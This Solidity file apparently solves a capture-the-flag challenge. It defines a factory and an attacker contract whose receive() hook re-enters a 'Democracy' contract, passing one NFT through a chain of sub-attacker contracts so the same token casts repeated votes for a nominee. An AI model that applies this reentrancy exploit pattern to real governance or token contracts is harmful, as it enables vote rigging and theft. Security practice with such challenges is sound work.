// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Democracy.sol";

contract DemocracyAttackerFactory {
    function createAttacker(Democracy target, address nominee) public returns (address) {
        DemocracyAttacker attacker = new DemocracyAttacker(target, nominee, address(this));
        return address(attacker);
    }
}

contract DemocracyAttacker is IERC721Receiver {
    Democracy target;
    DemocracyAttackerFactory factory;
    address nominee;

    constructor(Democracy _target, address _nominee, address _factory) {
        target = _target;
        nominee = _nominee;
        factory = DemocracyAttackerFactory(_factory);
    }

    function attack() public {
        target.vote(nominee);
    }

    function createSubAttacker() public returns (address) {
        return factory.createAttacker(target, nominee);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        if (target.votes(nominee) < 6) {
            address subAttacker = createSubAttacker();
            bytes memory empty;
            target.safeTransferFrom(address(this), subAttacker, 0, empty);
            DemocracyAttacker(payable(subAttacker)).attack();
        }
    }
}